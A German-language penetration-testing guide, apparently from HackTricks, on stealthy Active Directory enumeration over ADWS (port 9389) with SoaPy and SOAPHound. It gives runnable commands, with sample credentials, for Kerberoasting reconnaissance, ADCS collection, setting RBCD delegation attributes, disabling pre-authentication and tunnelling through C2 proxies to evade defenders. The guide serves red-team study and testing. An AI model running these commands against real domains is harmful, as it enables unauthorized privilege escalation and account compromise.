# Active Directory Web Services (ADWS) Aufzählung & verdeckte Sammlung

{{#include ../../banners/hacktricks-training.md}}

## Was ist ADWS?

Active Directory Web Services (ADWS) ist **seit Windows Server 2008 R2 standardmäßig auf jedem Domain Controller aktiviert** und hört auf TCP **9389**. Trotz des Namens ist **kein HTTP beteiligt**. Stattdessen stellt der Dienst LDAP-ähnliche Daten über einen Stack proprietärer .NET-Framing-Protokolle bereit:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Da der Traffic in diesen binären SOAP-Frames gekapselt ist und über einen unüblichen Port läuft, wird **Aufzählung über ADWS viel weniger wahrscheinlich inspiziert, gefiltert oder signiert als klassischer LDAP/389 & 636-Traffic**. Für Operatoren bedeutet das:

* Unauffälligere Aufklärung – Blue Teams konzentrieren sich oft auf LDAP-Abfragen.
* Freiheit, von Nicht-Windows-Hosts (Linux, macOS) zu sammeln, indem 9389/TCP durch einen SOCKS-Proxy getunnelt wird.
* Die gleichen Daten wie über LDAP (Benutzer, Gruppen, ACLs, Schema, etc.) und die Möglichkeit, **Schreibvorgänge** durchzuführen (z. B. `msDs-AllowedToActOnBehalfOfOtherIdentity` für **RBCD**).

ADWS-Interaktionen werden über WS-Enumeration implementiert: Jede Abfrage beginnt mit einer `Enumerate`-Nachricht, die den LDAP-Filter/Attribute definiert und eine `EnumerationContext`-GUID zurückgibt, gefolgt von einer oder mehreren `Pull`-Nachrichten, die bis zum serverdefinierten Ergebnisfenster streamen. Kontexte verfallen nach ~30 Minuten, daher müssen Tools entweder die Ergebnisse paginieren oder Filter aufteilen (Präfixabfragen pro CN), um Zustandsverlust zu vermeiden. Wenn Sicherheitsdeskriptoren abgefragt werden, geben Sie die `LDAP_SERVER_SD_FLAGS_OID`-Control an, um SACLs auszuschließen, andernfalls entfernt ADWS einfach das `nTSecurityDescriptor`-Attribut aus seiner SOAP-Antwort.

> HINWEIS: ADWS wird auch von vielen RSAT GUI/PowerShell-Tools verwendet, sodass der Traffic mit legitimer Admin-Aktivität verschmelzen kann.

## SoaPy – Native Python-Client

[SoaPy](https://github.com/logangoins/soapy) ist eine **vollständige Neuimplementierung des ADWS-Protokollstapels in reinem Python**. Es konstruiert die NBFX/NBFSE/NNS/NMF-Frames Byte-für-Byte und erlaubt das Sammeln von Unix-ähnlichen Systemen, ohne die .NET-Runtime zu verwenden.

### Wichtige Funktionen

* Unterstützt **Proxying über SOCKS** (nützlich für C2-Implants).
* Feinkörnige Suchfilter, identisch zu LDAP `-q '(objectClass=user)'`.
* Optionale **Schreibvorgänge** (`--set` / `--delete`).
* **BOFHound-Ausgabemodus** für direkten Import in BloodHound.
* `--parse`-Flag, um Timestamps / `userAccountControl` leserlich aufzubereiten, wenn menschliche Lesbarkeit erforderlich ist.

### Zielgerichtete Collection-Flags & Schreiboperationen

SoaPy wird mit kuratierten Schaltern geliefert, die die häufigsten LDAP-Hunting-Aufgaben über ADWS nachbilden: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, sowie rohe `--query` / `--filter`-Knobs für benutzerdefinierte Pulls. Kombinieren Sie diese mit Schreibprimitiven wie `--rbcd <source>` (setzt `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (SPN-Staging für gezieltes Kerberoasting) und `--asrep` (schaltet `DONT_REQ_PREAUTH` in `userAccountControl`).

Beispiel einer gezielten SPN-Suche, die nur `samAccountName` und `servicePrincipalName` zurückgibt:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Verwende denselben Host/dieselben Zugangsdaten, um die Funde sofort auszunutzen: RBCD-fähige Objekte mit `--rbcds` auslesen, und wende dann `--rbcd 'WEBSRV01$' --account 'FILE01$'` an, um eine Resource-Based Constrained Delegation chain einzurichten (siehe [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) für den vollständigen Missbrauchspfad).

### Installation (Operator-Host)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## SOAPHound – Hochvolumige ADWS-Erfassung (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) ist ein .NET-Collector, der alle LDAP-Interaktionen innerhalb von ADWS hält und BloodHound v4-kompatibles JSON erzeugt. Er baut einmalig einen vollständigen Cache der Attribute `objectSid`, `objectGUID`, `distinguishedName` und `objectClass` auf (`--buildcache`) und verwendet ihn dann für hochvolumige `--bhdump`, `--certdump` (ADCS) oder `--dnsdump` (AD-integrated DNS)-Durchläufe, sodass nur ca. 35 kritische Attribute den DC jemals verlassen. AutoSplit (`--autosplit --threshold <N>`) teilt Abfragen automatisch nach CN-Präfix, um in großen Forests unter dem 30‑Minuten EnumerationContext-Timeout zu bleiben.

Typischer Ablauf auf einer an die Domain angebundenen Operator-VM:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Exportiere JSON-Slots direkt in SharpHound/BloodHound-Workflows — siehe [BloodHound methodology](bloodhound.md) für Ideen zur nachgelagerten Graphanalyse. AutoSplit macht SOAPHound in Multi-Millionen-Objekt-Forests robust, während die Anzahl der Abfragen geringer bleibt als bei ADExplorer-style snapshots.

## Stealth AD-Erfassungs-Workflow

Der folgende Workflow zeigt, wie man über ADWS **Domänen- & ADCS-Objekte** enumeriert, sie in BloodHound JSON konvertiert und nach zertifikatbasierten Angriffspfaden sucht – alles von Linux aus:

1. **Tunnel 9389/TCP** vom Zielnetzwerk zu deinem Rechner (z. B. via Chisel, Meterpreter, SSH dynamic port-forward, etc.). Exportiere `export HTTPS_PROXY=socks5://127.0.0.1:1080` oder benutze SoaPy’s `--proxyHost/--proxyPort`.

2. **Sammle das Root-Domain-Objekt:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **ADCS-bezogene Objekte aus dem Configuration NC sammeln:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **In BloodHound konvertieren:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Lade die ZIP hoch** in der BloodHound-GUI und führe Cypher-Abfragen wie `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` aus, um Zertifikats-Eskalationspfade (ESC1, ESC8, etc.) aufzudecken.

### Schreiben von `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Kombiniere dies mit `s4u2proxy`/`Rubeus /getticket` für eine vollständige **Resource-Based Constrained Delegation**-Kette (siehe [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Tooling-Zusammenfassung

| Zweck | Tool | Hinweise |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, read/write |
| High-volume ADWS dump | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS modes |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | Converts SoaPy/ldapsearch logs |
| Cert compromise | [Certipy](https://github.com/ly4k/Certipy) | Can be proxied through same SOCKS |

## Referenzen

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
